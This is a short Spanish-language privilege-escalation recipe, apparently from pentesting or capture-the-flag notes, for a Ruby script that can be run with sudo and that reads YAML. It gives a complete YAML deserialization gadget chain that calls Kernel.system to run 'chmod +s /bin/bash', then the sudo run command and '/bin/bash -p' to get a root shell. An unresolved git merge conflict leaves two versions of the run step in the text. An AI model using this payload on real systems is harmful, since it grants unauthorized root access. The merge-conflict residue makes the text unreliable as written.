Si el archivo en el cual tienes permisos tiene las función para leer un yml o puedes editarlo agrega: ==File.read(‘sample.yml’)==

Después agrega esto en el archivo .yml

```yml

---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve

```


Ejecuta el archivo,
<<<<<<< HEAD
  ```bash
  
sudo /usr/bin/ruby /directoriodelarchivo
```
=======
```bash
sudo /usr/bin/ruby archivo.rb
```

>>>>>>> 5b0814ed63ffd2f30d31a95ba5bd05c89207d07d
Ahora typea

```bash

/bin/bash -p
```
